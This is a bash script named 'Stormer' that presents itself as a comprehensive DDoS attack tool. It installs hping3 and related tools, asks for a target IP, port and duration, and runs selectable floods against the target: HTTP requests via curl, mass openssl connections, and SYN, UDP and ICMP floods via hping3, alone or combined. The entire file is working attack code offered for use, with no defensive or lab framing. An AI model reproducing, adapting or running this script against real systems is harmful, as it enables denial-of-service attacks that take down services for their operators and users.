#!/bin/bash

# Function to print headers
function print_header() {
  echo "========================================"
  echo "$1"
  echo "========================================"
}

# Check for required tools and install if missing
function check_tools() {
  for tool in proxychains4 curl hping3 openssl; do
    if ! command -v $tool &> /dev/null; then
      echo "$tool is not installed. Installing..."
      sudo apt-get install -y $tool
    fi
  done
}

# Attack functions
function http_flood() {
  echo "Running HTTP Flood attack..."
  for i in {1..1000}; do
    curl -s "$TARGET" >/dev/null &
  done
}

function tls_bypass() {
  echo "Running TLS Bypass attack..."
  for i in {1..500}; do
    openssl s_client -connect "$TARGET" -quiet &
  done
}

function multi_vector() {
  echo "Running Multi-Vector attack..."
  for i in {1..700}; do
    hping3 -S "$TARGET" -p "$PORT" -i u1 &
  done
}

function syn_flood() {
  echo "Running SYN Flood attack..."
  hping3 -S "$TARGET" -p "$PORT" --flood &
}

function udp_flood() {
  echo "Running UDP Flood attack..."
  hping3 --udp "$TARGET" -p "$PORT" --flood &
}

function icmp_flood() {
  echo "Running ICMP Flood attack..."
  hping3 --icmp "$TARGET" --flood &
}

function mixed_attack() {
  echo "Running Mixed Attack..."
  syn_flood &
  udp_flood &
  icmp_flood &
}

# Execution starts here
check_tools
print_header "Stormer - Comprehensive DDoS Attack Script"

# Prompt for target IP and port
read -p "Please enter the target server IP: " TARGET
read -p "Enter target port: " PORT
read -p "How long do you want the attacks to run (in seconds)? " DURATION

# Main menu for attack types
while true; do
  echo "Select attack types (you can choose multiple by separating with commas):"
  echo "1. HTTP Flood"
  echo "2. TLS Bypass"
  echo "3. Multi-Vector"
  echo "4. SYN Flood"
  echo "5. UDP Flood"
  echo "6. ICMP Flood"
  echo "7. Mixed Attack (SYN, UDP, ICMP)"
  echo "8. Exit"
  
  read -p "Enter your choice(s) [e.g., 1,3,5]: " choice

  # Parse and run selected attacks
  IFS=',' read -ra ATTACKS <<< "$choice"
  for attack in "${ATTACKS[@]}"; do
    case $attack in
      1) http_flood ;;
      2) tls_bypass ;;
      3) multi_vector ;;
      4) syn_flood ;;
      5) udp_flood ;;
      6) icmp_flood ;;
      7) mixed_attack ;;
      8) echo "Exiting..."; exit 0 ;;
      *) echo "Invalid choice: $attack" ;;
    esac
  done

  # Run for specified duration
  echo "Attacks running for $DURATION seconds..."
  sleep $DURATION

  # Stop all processes
  echo "Stopping attack processes..."
  pkill -f hping3
  pkill -f curl
  pkill -f openssl

  echo "Stormer attack completed. All attacks stopped."
  break
done

